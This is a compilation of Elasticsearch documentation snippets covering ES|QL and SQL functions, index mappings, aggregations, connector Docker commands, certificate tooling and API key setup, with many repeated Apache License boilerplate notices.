DESCRIPTION: Dynamic type class for handling version string doc values with methods for string conversion, list operations, and version object manipulation.

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.versionfield.VersionStringDocValuesField @dynamic_type {
    String asString(String)
    String asString(int, String)
    List asStrings()
    Version get(Version)
    Version get(int, Version)
}

----------------------------------------

TITLE: Restricting TransformerFactory Usage in Java
DESCRIPTION: This snippet defines a security restriction on the use of TransformerFactory in Java. It recommends using IdPSamlTestCase#getHardenedXMLTransformer() instead of direct instantiation.

LANGUAGE: java
CODE:
@defaultMessage TransformerFactory should not be used directly. Use IdPSamlTestCase#getHardenedXMLTransformer() instead.
javax.xml.transform.TransformerFactory#newInstance()
javax.xml.transform.TransformerFactory#newInstance(java.lang.String, java.lang.ClassLoader)

----------------------------------------

TITLE: Creating Secure HDFS Repository with Basic Principal
DESCRIPTION: Example of creating an HDFS repository with Kerberos authentication using a basic principal configuration.

LANGUAGE: json
CODE:
PUT _snapshot/my_hdfs_repository
{
  "type": "hdfs",
  "settings": {
    "uri": "hdfs://namenode:8020/",
    "path": "/user/elasticsearch/repositories/my_hdfs_repository",
    "security.principal": "elasticsearch@REALM"
  }
}

----------------------------------------

TITLE: Complete Moving Function Example
DESCRIPTION: Complete example showing moving function aggregation embedded within a date histogram aggregation with sum metric.

LANGUAGE: console
CODE:
POST /_search
{
  "size": 0,
  "aggs": {
    "my_date_histo": {                  
      "date_histogram": {
        "field": "date",
        "calendar_interval": "1M"
      },
      "aggs": {
        "the_sum": {
          "sum": { "field": "price" }   
        },
        "the_movfn": {
          "moving_fn": {
            "buckets_path": "the_sum",  
            "window": 10,
            "script": "MovingFunctions.unweightedAvg(values)"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: JWT Key Files Reference
DESCRIPTION: Reference to three JSON Web Key Set (JWKS) files used for JWT authentication: RSA private/public key pairs and HMAC keys. These files are generated via JwtRealmGenerateTests and contain cryptographic keys for JWT validation.

LANGUAGE: plaintext
CODE:
rsa-private-jwkset.json\nrsa-public-jwkset.json\nhmac-jwkset.json

----------------------------------------

TITLE: Applying Apache License Boilerplate Notice
DESCRIPTION: Standard boilerplate text for applying the Apache License 2.0 to a work. This notice should be included with appropriate comment syntax and filled in with project-specific information.

LANGUAGE: plaintext
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Enabling PostgreSQL Transaction Commit Time Tracking
DESCRIPTION: Shell command to enable tracking of commit timestamps in PostgreSQL transactions, which is required for efficient syncing.

LANGUAGE: shell
CODE:
ALTER SYSTEM SET track_commit_timestamp = on;

----------------------------------------

TITLE: Copy_to Configuration with Semantic Text
DESCRIPTION: Shows how to configure copy_to functionality with semantic_text fields for collecting values from other fields.

LANGUAGE: console
CODE:
PUT test-index
{
    "mappings": {
        "properties": {
            "source_field": {
                "type": "text",
                "copy_to": "infer_field"
            },
            "infer_field": {
                "type": "semantic_text",
                "inference_id": ".elser-2-elasticsearch"
            }
        }
    }
}

----------------------------------------

TITLE: Running Dropbox Connector Docker Image
DESCRIPTION: Command to run the Dropbox connector as a Docker container. This setup allows for easy deployment and management of the connector service.

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Importing Cross-Certificates
DESCRIPTION: Imports client certificate into server keystore and server certificate into client keystore for mutual authentication.

LANGUAGE: bash
CODE:
keytool -v -importcert -alias client -file client.crt -keystore server.keystore -storepass password
keytool -v -importcert -alias server -file server.crt -keystore client.keystore -storepass password

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate text for applying the Apache License 2.0 to a software project. Includes copyright notice and standard terms text that should be included in source files.

LANGUAGE: text
CODE:
Copyright [yyyy] [name of copyright owner]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: MV_FIRST Function Documentation Header
DESCRIPTION: Main documentation header and syntax section for the MV_FIRST function with embedded SVG diagram reference.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `MV_FIRST` [esql-mv_first]

**Syntax**

:::{image} ../../../images/functions/mv_first.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Parent/Child Inner Hits Example in Elasticsearch
DESCRIPTION: This example shows how to use parent/child inner hits in Elasticsearch. It includes creating a mapping with a join field, indexing parent and child documents, and performing a search with parent/child inner hits.

LANGUAGE: console
CODE:
PUT test
{
  "mappings": {
    "properties": {
      "my_join_field": {
        "type": "join",
        "relations": {
          "my_parent": "my_child"
        }
      }
    }
  }
}

PUT test/_doc/1?refresh
{
  "number": 1,
  "my_join_field": "my_parent"
}

PUT test/_doc/2?routing=1&refresh
{
  "number": 1,
  "my_join_field": {
    "name": "my_child",
    "parent": "1"
  }
}

POST test/_search
{
  "query": {
    "has_child": {
      "type": "my_child",
      "query": {
        "match": {
          "number": 1
        }
      },
      "inner_hits": {}    <1>
    }
  }
}

----------------------------------------

TITLE: Defining ESQL Function Test Parameters in Markdown
DESCRIPTION: Specifies the 'field' parameter for ESQL function tests. The parameter is defined without any additional details or constraints.

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   

----------------------------------------

TITLE: Converting Radians to Degrees using TO_DEGREES in ESQL
DESCRIPTION: This snippet demonstrates the usage of the TO_DEGREES function in ESQL. It converts a list of radian values to their corresponding degree values.

LANGUAGE: sql
CODE:
ROW rad = [1.57, 3.14, 4.71]
| EVAL deg = TO_DEGREES(rad)

----------------------------------------

TITLE: Setting Index-Specific Store Type via API
DESCRIPTION: Creates a new index with a specific storage type using the Elasticsearch REST API. This is a static setting that must be set at index creation time.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "index.store.type": "hybridfs"
  }
}

----------------------------------------

TITLE: Including MV_MIN Function Types in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the supported types for the MV_MIN function.

LANGUAGE: markdown
CODE:
:::{include} ../types/mv_min.md
:::

----------------------------------------

TITLE: Including ST_XMIN Function Examples in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing usage examples for the ST_XMIN function.

LANGUAGE: markdown
CODE:
:::{include} ../examples/st_xmin.md
:::

----------------------------------------

TITLE: Correct HISTOGRAM with Month Example
DESCRIPTION: Correct way to use HISTOGRAM with month extraction from birth date.

LANGUAGE: sql
CODE:
SELECT HISTOGRAM(MONTH(birth_date), 2) AS h, COUNT(*) as c FROM emp GROUP BY h ORDER BY h DESC;

----------------------------------------

TITLE: Testing Nori Number Token Filter Analysis
DESCRIPTION: Example showing how to analyze text using the configured analyzer with nori_number filter. The example tests Korean number normalization with mixed format numbers.

LANGUAGE: console
CODE:
GET nori_sample/_analyze
{
  "analyzer": "my_analyzer",
  "text": "십만이천오백과 ３.２천"
}

----------------------------------------

TITLE: PERCENTILE Function Documentation Structure
DESCRIPTION: Markdown structure defining the documentation sections for the PERCENTILE function, including references to external files and an SVG diagram.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `PERCENTILE` [esql-percentile]

**Syntax**

:::{image} ../../../images/functions/percentile.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/percentile.md
:::

:::{include} ../description/percentile.md
:::

:::{include} ../types/percentile.md
:::

:::{include} ../examples/percentile.md
:::

:::{include} ../appendix/percentile.md
:::

----------------------------------------

TITLE: Apache License Boilerplate Notice Template
DESCRIPTION: Standard boilerplate notice text for applying the Apache License to a work, with placeholders for copyright information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: ESQL String Literals
DESCRIPTION: Demonstrates the use of string literals in ESQL, including regular double-quoted strings and triple-quoted strings for handling embedded quotes.

LANGUAGE: esql
CODE:
// Filter by a string value
FROM index
| WHERE first_name == "Georgi"

LANGUAGE: esql
CODE:
ROW name = """Indiana "Indy" Jones"""

----------------------------------------

TITLE: Generating CA Certificate
DESCRIPTION: Creates a CA (Certificate Authority) certificate in PKCS#12 format with a 9999 day validity period using elasticsearch-certutil.

LANGUAGE: bash
CODE:
$ES_HOME/bin/elasticsearch-certutil ca --out ca.p12 --pass "ca-password" --days 9999

----------------------------------------

TITLE: Defining ConstantKeywordDocValuesField Class in Java
DESCRIPTION: Declares the ConstantKeywordDocValuesField class in the org.elasticsearch.xpack.constantkeyword package. The class is marked with @dynamic_type annotation and extends BaseKeywordDocValuesField for handling constant keyword field values in Elasticsearch.

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.constantkeyword.ConstantKeywordDocValuesField @dynamic_type {
}

----------------------------------------

TITLE: Inserting Kubernetes Pod Metrics into Elasticsearch using Bulk API
DESCRIPTION: This snippet demonstrates the structure for inserting multiple Kubernetes pod metrics into Elasticsearch using the bulk API. Each metric includes timestamp, pod details, network statistics, and CPU usage information.

LANGUAGE: json
CODE:
{"create": {}}
{"@timestamp": "2021-04-29T17:29:12.470Z", "metricset": "pod", "k8s": {"pod": {"name": "cat", "uid":"947e4ced-1786-4e53-9e0c-5c447e959507", "network": {"tx": 2001818691, "rx": 802133794},"cpu": {"limit": 0.3787411612903226, "nanocores": 35222928, "node": 0.048845732}}}}
{"create": {}}
{"@timestamp": "2021-04-29T17:29:12.470Z", "metricset": "pod", "k8s": {"pod": {"name": "hamster", "uid":"947e4ced-1786-4e53-9e0c-5c447e959508", "network": {"tx": 2005177954, "rx": 801479970},"cpu": {"limit": 0.5786461612903226, "nanocores": 25222928, "node": 0.505805732}}}}

----------------------------------------

TITLE: Configuring Elasticsearch YAML for GCE Tag Discovery
DESCRIPTION: YAML configuration for Elasticsearch to enable GCE discovery with tag filtering. Specifies project ID, zone, and discovery settings including tag filters.

LANGUAGE: yaml
CODE:
cloud:
  gce:
    project_id: es-cloud
    zone: europe-west1-a
discovery:
  seed_providers: gce
    gce:
      tags: elasticsearch, dev

----------------------------------------

TITLE: Custom User Script Example
DESCRIPTION: Example showing how to use custom scripting to implement a first-value function in the moving window.

LANGUAGE: console
CODE:
POST /_search
{
  "size": 0,
  "aggs": {
    "my_date_histo": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "1M"
      },
      "aggs": {
        "the_sum": {
          "sum": { "field": "price" }
        },
        "the_movavg": {
          "moving_fn": {
            "buckets_path": "the_sum",
            "window": 10,
            "script": "return values.length > 0 ? values[0] : Double.NaN"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Apache License Boilerplate Notice Template
DESCRIPTION: Template text for applying the Apache License 2.0 to a work, with placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Applying Apache License Boilerplate Notice
DESCRIPTION: Standard boilerplate text for applying the Apache License to a software project. Required fields should be filled with project-specific information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Configuring Synthetic Source for Range Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates how to configure synthetic _source for a long_range field and shows how ranges are sorted and deduplicated in the resulting synthetic source.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "my_range": { "type": "long_range" }
    }
  }
}

PUT idx/_doc/1
{
  "my_range": [
    {
        "gte": 200,
        "lte": 300
    },
    {
        "gte": 1,
        "lte": 100
    },
    {
        "gte": 200,
        "lte": 300
    },
    {
        "gte": 200,
        "lte": 500
    }
  ]
}

----------------------------------------

TITLE: Conflict Resolution with Pass-through Objects in Elasticsearch
DESCRIPTION: This example shows how conflicts are resolved when using pass-through objects, including scenarios with conflicting field names at different levels and between multiple pass-through objects.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1
{
  "attributes" : {
    "id": "foo"
  },
  "id": "bar"
}

PUT my-index-000002
{
  "mappings": {
    "properties": {
      "attributes": {
        "type": "passthrough",
        "priority": 10,
        "properties": {
          "id": {
            "type": "keyword"
          }
        }
      },
      "resource.attributes": {
        "type": "passthrough",
        "priority": 20,
        "properties": {
          "id": {
            "type": "keyword"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Running the Docker Image for Connector Service
DESCRIPTION: Command to run the Docker image with the Connector Service for the SharePoint Server connector.

LANGUAGE: sh
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Microsoft Teams Connector Configuration in YAML
DESCRIPTION: Example YAML configuration for deploying the Microsoft Teams connector using Docker. This snippet shows the structure of the configuration file, including Elasticsearch connection details and connector settings.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: microsoft_teams
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead

----------------------------------------

TITLE: Defining Shared Folder Path
DESCRIPTION: Sets the SHARED_FOLDER environment variable to the Elasticsearch data directory.

LANGUAGE: bash
CODE:
SHARED_FOLDER=/tmp/sharedESData

----------------------------------------

TITLE: Displaying ST_YMIN Function Syntax Diagram in Markdown
DESCRIPTION: This snippet embeds an SVG image showing the syntax diagram for the ST_YMIN function in ESQL.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/st_ymin.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Date Nanoseconds Mapping and Query Example
DESCRIPTION: Demonstrates creating an index with a date_nanos field, inserting data in various formats, and querying with sort and runtime mappings to handle nanosecond precision.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "date": {
        "type": "date_nanos"
      }
    }
  }
}

PUT my-index-000001/_bulk?refresh
{ "index" : { "_id" : "1" } }
{ "date": "2015-01-01" }
{ "index" : { "_id" : "2" } }
{ "date": "2015-01-01T12:10:30.123456789Z" }
{ "index" : { "_id" : "3" } }
{ "date": 1420070400000 }

GET my-index-000001/_search
{
  "sort": { "date": "asc"},
  "runtime_mappings": {
    "date_has_nanos": {
      "type": "boolean",
      "script": "emit(doc['date'].value.nano != 0)"
    }
  },
  "fields": [
    {
      "field": "date",
      "format": "strict_date_optional_time_nanos"
    },
    {
      "field": "date_has_nanos"
    }
  ]
}

----------------------------------------

TITLE: Including LEFT Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various documentation sections for the LEFT function using Markdown include directives. It covers parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/left.md
:::

:::{include} ../description/left.md
:::

:::{include} ../types/left.md
:::

:::{include} ../examples/left.md
:::

----------------------------------------

TITLE: Creating API Key for MongoDB Connector
DESCRIPTION: Example of creating an API key for the MongoDB connector using the Elasticsearch API. This key is used for authentication and authorization of the connector.

LANGUAGE: json
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Configuring Global Store Type in Elasticsearch YAML
DESCRIPTION: Sets the default storage type for all indices in the Elasticsearch configuration file. This example sets the storage type to hybridfs.

LANGUAGE: yaml
CODE:
index.store.type: hybridfs

----------------------------------------

TITLE: Including HASH Function Parameters in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the parameters for the HASH function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/hash.md
:::

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License 2.0 to a work. This notice should be customized with the appropriate copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: HISTOGRAM with Expression Example
DESCRIPTION: Example showing HISTOGRAM usage with a modulo expression on salary data.

LANGUAGE: sql
CODE:
SELECT HISTOGRAM(salary % 100, 10) AS h, COUNT(*) AS c FROM emp GROUP BY h;

----------------------------------------

TITLE: Disabling Norms via Mapping API in Elasticsearch
DESCRIPTION: Example of using the update mapping API to disable norms for a text field named 'title'. This operation helps reduce disk usage when scoring functionality isn't needed for the field. Note that while norms can be disabled, they cannot be re-enabled after the fact.

LANGUAGE: console
CODE:
PUT my-index-000001/_mapping
{
  "properties": {
    "title": {
      "type": "text",
      "norms": false
    }
  }
}

----------------------------------------

TITLE: Running Docker Container for Connector Service
DESCRIPTION: Docker command to run the Elastic connector service with mounted configuration.

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Applying Apache License Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License to a work. Fields in brackets should be replaced with appropriate identifying information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Reading and Parsing Certificates
DESCRIPTION: Commands for inspecting certificate contents using OpenSSL, including viewing certificate text and parsing ASN.1 structure with focus on SAN extensions.

LANGUAGE: bash
CODE:
export CERT_PATH=$SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes
export CERT=ca-signed/n1.c1.crt
openssl x509 -in $CERT_PATH/$CERT -text
openssl asn1parse -in $CERT_PATH/$CERT
openssl asn1parse -in $CERT_PATH/$CERT -strparse 492 # location for SAN OCTET STRING

----------------------------------------

TITLE: Instance Creation Output
DESCRIPTION: Example output showing the created GCE instance details.

LANGUAGE: text
CODE:
Created [https://www.googleapis.com/compute/v1/projects/es-cloud-1070/zones/us-central1-f/instances/myesnode1].
NAME      ZONE          MACHINE_TYPE  PREEMPTIBLE INTERNAL_IP   EXTERNAL_IP   STATUS
myesnode1 us-central1-f n1-standard-1             10.240.133.54 104.197.94.25 RUNNING

----------------------------------------

TITLE: Using EXP Function in Elasticsearch SQL
DESCRIPTION: Returns Euler's number raised to the power of the input numeric expression.

LANGUAGE: sql
CODE:
SELECT EXP(1), E(), EXP(2), E() * E();

     EXP(1)      |       E()       |     EXP(2)     |     E() * E()
-----------------+-----------------+----------------+------------------
2.718281828459045|2.718281828459045|7.38905609893065|7.3890560989306495

----------------------------------------

TITLE: Replacing Java NIO Path Operations in Elasticsearch
DESCRIPTION: Specifies alternative methods from org.elasticsearch.core.PathUtils to use instead of java.nio.file.Paths and java.nio.file.Path methods for file path operations.

LANGUAGE: java
CODE:
java.nio.file.Paths @ Use org.elasticsearch.core.PathUtils.get() instead.
java.nio.file.Path#of(java.net.URI) @ Use org.elasticsearch.core.PathUtils.get() instead.
java.nio.file.Path#of(java.lang.String, java.lang.String[]) @ Use org.elasticsearch.core.PathUtils.get() instead.
java.nio.file.FileSystems#getDefault() @ use org.elasticsearch.core.PathUtils.getDefaultFileSystem() instead.

----------------------------------------

TITLE: JSON Utility Class Definition
DESCRIPTION: Defines a JSON utility class with methods for parsing JSON strings and serializing objects to JSON format, with optional formatting control.

LANGUAGE: java
CODE:
class org.elasticsearch.painless.api.Json {
  def load(String)
  String dump(def)
  String dump(def, boolean)
}

----------------------------------------

TITLE: Alternative GCE Instance Creation with Compute Scope
DESCRIPTION: Shortened version of the knife-google command using the compute-rw alias for service account scopes.

LANGUAGE: sh
CODE:
    --gce-service-account-scopes compute-rw

----------------------------------------

TITLE: Indexing a MultiPoint shape in GeoJSON format
DESCRIPTION: Example of indexing a multipoint shape using the GeoJSON format in Elasticsearch. MultiPoints are represented as an array of point coordinates.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "multipoint",
    "coordinates" : [
      [1002.0, 1002.0], [1003.0, 2000.0]
    ]
  }
}

----------------------------------------

TITLE: Running End-to-End Tests for Microsoft Teams Connector
DESCRIPTION: Shell commands for running end-to-end tests for the Microsoft Teams connector. These commands demonstrate how to execute functional tests against a real data source.

LANGUAGE: shell
CODE:
$ make ftest NAME=microsoft_teams

LANGUAGE: shell
CODE:
make ftest NAME=microsoft_teams DATA_SIZE=small

----------------------------------------

TITLE: Context Suggester Configuration
DESCRIPTION: Setup for context-aware suggestions with category and geo location contexts

LANGUAGE: console
CODE:
PUT place
{
  "mappings": {
    "properties": {
      "suggest": {
        "type": "completion",
        "contexts": [
          {
            "name": "place_type",
            "type": "category"
          },
          {
            "name": "location",
            "type": "geo",
            "precision": 4
          }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Documentation Header Comment
DESCRIPTION: A header comment indicating that this is an auto-generated file by ESQL's AbstractFunctionTestCase.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Defining URI Parts Processor in Elasticsearch
DESCRIPTION: Example configuration for the URI parts processor in an Elasticsearch ingest pipeline. It specifies the input field, target field, and options for handling the original input.

LANGUAGE: json
CODE:
{
  "description" : "...",
  "processors" : [
    {
      "uri_parts": {
        "field": "input_field",
        "target_field": "url",
        "keep_original": true,
        "remove_if_successful": false
      }
    }
  ]
}

----------------------------------------

TITLE: Including HASH Function Data Types in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the data types for the HASH function.

LANGUAGE: markdown
CODE:
:::{include} ../types/hash.md
:::

----------------------------------------

TITLE: Min Bucket Aggregation Response Example
DESCRIPTION: Shows the response format for a min_bucket aggregation, including bucket data and the minimum value found.

LANGUAGE: console-result
CODE:
{
   "took": 11,
   "timed_out": false,
   "_shards": ...,
   "hits": ...,
   "aggregations": {
      "sales_per_month": {
         "buckets": [
            {
               "key_as_string": "2015/01/01 00:00:00",
               "key": 1420070400000,
               "doc_count": 3,
               "sales": {
                  "value": 550.0
               }
            },
            {
               "key_as_string": "2015/02/01 00:00:00",
               "key": 1422748800000,
               "doc_count": 2,
               "sales": {
                  "value": 60.0
               }
            },
            {
               "key_as_string": "2015/03/01 00:00:00",
               "key": 1425168000000,
               "doc_count": 2,
               "sales": {
                  "value": 375.0
               }
            }
         ]
      },
      "min_monthly_sales": {
          "keys": ["2015/02/01 00:00:00"],
          "value": 60.0
      }
   }
}

----------------------------------------

TITLE: Configuring Default Similarity
DESCRIPTION: Examples showing how to set and modify the default similarity settings for an index, including operations for closed index modifications.

LANGUAGE: console
CODE:
PUT /index
{
  "settings": {
    "index": {
      "similarity": {
        "default": {
          "type": "boolean"
        }
      }
    }
  }
}

LANGUAGE: console
CODE:
POST /index/_close

PUT /index/_settings
{
  "index": {
    "similarity": {
      "default": {
        "type": "boolean"
      }
    }
  }
}

POST /index/_open

----------------------------------------

TITLE: Including TOP Function Examples in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing examples of using the TOP function.

LANGUAGE: markdown
CODE:
:::{include} ../examples/top.md
:::

----------------------------------------

TITLE: Apache License Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text for applying the Apache License to a work, including copyright notice and license reference.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: ESQL Match Function Warning
DESCRIPTION: A warning message indicating that the MATCH function is in technical preview and should not be used in production environments.

LANGUAGE: markdown
CODE:
::::{warning}
Do not use on production environments. This functionality is in technical preview and
may be changed or removed in a future release. Elastic will work to fix any issues, but features in technical preview
are not subject to the support SLA of official GA features.
::::

----------------------------------------

TITLE: CAST Function Example - Date String to Timestamp
DESCRIPTION: Example of casting a date string to a timestamp and extracting the year.

LANGUAGE: sql
CODE:
SELECT YEAR(CAST('2018-05-19T11:23:45Z' AS TIMESTAMP)) AS year;

     year
---------------
2018

----------------------------------------

TITLE: Including MV_MEDIAN Function Types in Markdown
DESCRIPTION: This snippet includes the supported types for the MV_MEDIAN function from an external file.

LANGUAGE: markdown
CODE:
:::{include} ../types/mv_median.md
:::

----------------------------------------

TITLE: Including ENDS_WITH Function Examples in Markdown
DESCRIPTION: This snippet includes usage examples for the ENDS_WITH function from a separate markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../examples/ends_with.md
:::

----------------------------------------

TITLE: Creating an Index with Synthetic Source for Aggregate Metric Double Field
DESCRIPTION: This example shows how to create an Elasticsearch index with synthetic _source enabled and an aggregate_metric_double field. This setup is used for efficient storage and retrieval of pre-aggregated metric data.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "agg_metric": {
        "type": "aggregate_metric_double",
        "metrics": [ "min", "max", "sum", "value_count" ],
        "default_metric": "max"
      }
    }
  }
}

PUT idx/_doc/1
{
  "agg_metric": {
    "min": -302.50,
    "max": 702.30,
    "sum": 200.0,
    "value_count": 25
  }
}

----------------------------------------

TITLE: Generating TDVT Tests for Elasticsearch
DESCRIPTION: Command to generate TDVT tests specifically for the Elasticsearch connector, prompting for connection details and logical query config.

LANGUAGE: bash
CODE:
$TDVT action --add_ds elastic

----------------------------------------

TITLE: Elasticsearch System Key Generator Command Synopsis
DESCRIPTION: Shows the complete command syntax for elasticsearch-syskeygen including all available parameters and options.

LANGUAGE: shell
CODE:
bin/elasticsearch-syskeygen
[-E <KeyValuePair>] [-h, --help]
([-s, --silent] | [-v, --verbose])

----------------------------------------

TITLE: Applying Apache 2.0 License Boilerplate
DESCRIPTION: Standard copyright and license notice template for applying the Apache 2.0 license to your work. Includes placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Applying Apache License Boilerplate Notice
DESCRIPTION: Standard boilerplate text to apply the Apache License to a work. Users should replace the bracketed fields with their identifying information and use appropriate comment syntax for their file format.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

